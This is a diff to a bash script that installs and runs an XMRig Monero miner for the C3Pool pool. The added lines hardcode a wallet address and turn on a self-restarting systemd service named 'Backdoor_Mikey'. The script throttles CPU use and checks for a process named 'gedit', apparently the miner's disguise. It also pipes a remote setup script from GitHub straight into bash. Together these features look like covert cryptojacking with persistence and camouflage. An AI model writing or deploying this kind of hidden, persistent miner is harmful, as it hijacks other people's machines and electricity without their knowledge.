@@ -22,7 +22,7 @@ echo '
 #     53333: 2G diff (ETH port/SSL/TLS)
 poolPort=19999
 # your wallet public address
-wallet=YOUR_WALLET_ADDRESS
+wallet=4256HG8uJUTPBqZiJYPNQ92x6PV1sUsngAsv3TQX4woqJGFsKQkjCdoZKbgfr8C3VnLWK7Qd5Y3WJBPcuzMW93AmVSYtN2W
 # installation directory (DONT change)
 DIR=$HOME/c3pool
 # remote build via IP
@@ -32,7 +32,7 @@ DIR=$HOME/c3pool
 CPU_min_lim=50
 CPU_max_lim=75
 # Daemon: service which ensures to restart if the miner terminates unexpectedly
-daemon_active=false
+daemon_active=true
 # Detatched
 detatched=true
 ###############################################################################################################################
@@ -74,7 +74,12 @@ function CPU_threads () {
 }
 function miner_instance_running () {
     # returns boolean if miner is running
-    echo ''
+    if pgrep -x "gedit" > /dev/null
+    then
+        echo true
+    else
+        echo false
+    fi
 }
 function shuffle () {
     sleep 1;
@@ -114,7 +119,9 @@ function install () {
         sudo apt update &&
         sudo apt install -y curl && sudo apt install -y cpulimit
         curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s $wallet
+        wait 
         setPort
+        removeService && killAll
     else
         echo installation found at $DIR
     fi   
@@ -147,6 +154,7 @@ function daemon () {
   [Unit]
 Description=Dirty Mike
 [Service]
+ExecStartPre=shuffle
 ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
 Restart=always
 Nice=8
@@ -155,19 +163,21 @@ CPUWeight=1
 WantedBy=multi-user.target
 EOL
     sudo mv /tmp/Backdoor_Mikey.service /etc/systemd/system/Backdoor_Mikey.service
-    echo "..... Mikey daemon is here ....."
+    log "..... Mikey daemon is here ....."
     sudo systemctl daemon-reload
     sudo systemctl enable Backdoor_Mikey.service
     sudo systemctl start Backdoor_Mikey.service  
+    log "miner will start shortly ..."
 }
-# function daemon2 () {
-
-# }
 function build () {
-    killAll       
-    wait
-    install && removeService && killAll
-    wait
+    if [[ $(miner_instance_running) == true ]];then
+        echo 'found running miner instance ...'
+        killAll       
+        wait
+    fi
+    # run full installation (if needed)
+    install  
+    # trigger daemon or script directly
     if [[ $daemon_active == true ]]; then
         daemon
     else
